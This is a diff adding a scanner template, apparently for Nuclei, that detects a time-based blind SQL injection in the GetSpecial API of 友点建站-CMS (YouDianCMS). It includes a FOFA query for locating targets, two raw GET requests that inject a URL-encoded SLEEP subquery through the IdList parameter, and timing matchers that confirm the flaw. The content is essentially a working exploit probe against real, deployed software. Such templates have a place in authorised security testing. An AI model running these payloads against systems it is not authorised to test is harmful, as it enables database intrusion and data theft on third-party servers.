@@ -1,0 +1,33 @@
+id: youdiancms-blind-sqli
+info:
+  name: "友点建站-CMS GetSpecial接口SQL时间延迟注入漏洞"
+  author: 0dayPoc
+  severity: high
+  description: |-
+    fofa: app="友点建站-CMS"
+      友点建站-CMS 系统在 GetSpecial 接口处理逻辑中存在基于时间延迟的 SQL 注入漏洞。攻击者可通过构造恶意输入参数触发布尔盲注或时间延迟注入，绕过常规输入过滤机制，实现数据库结构探测、敏感数据提取或服务器控制权获取。该漏洞源于未正确对用户输入进行参数化处理，导致攻击者能够将恶意 SQL 代码注入数据库查询语句。
+  tags: YouDianCMS,友点建站-CMS
+http:
+- raw:
+  - |
+    GET /index.php/api/GetSpecial?debug=1&ChannelID=1&IdList=1,1%29%20and%20%28SELECT%20%2A%20FROM%20%28SELECT%28SLEEP%286%29%29%29A HTTP/1.1
+    Host: {{Hostname}}
+    accept: */*
+    Accept-Encoding: gzip, deflate, br
+    Accept-Language: zh-CN,zh;q=0.9
+    Cookie: PHPSESSID=din23h07blv026kk4tdqt1re00
+    Connection: close
+  - |
+    GET /index.php/api/GetSpecial?debug=1&ChannelID=1&IdList=1,1%29%20and%20%28SELECT%20%2A%20FROM%20%28SELECT%28SLEEP%288%29%29%29A HTTP/1.1
+    Host: {{Hostname}}
+    accept: */*
+    Accept-Encoding: gzip, deflate, br
+    Accept-Language: zh-CN,zh;q=0.9
+    Cookie: PHPSESSID=din23h07blv026kk4tdqt1re00
+    Connection: close
+  matchers:
+  - type: dsl
+    dsl:
+    - duration_1>=6 && duration_1<=7
+    - duration_2>=8 && duration_2<=9
+    condition: and
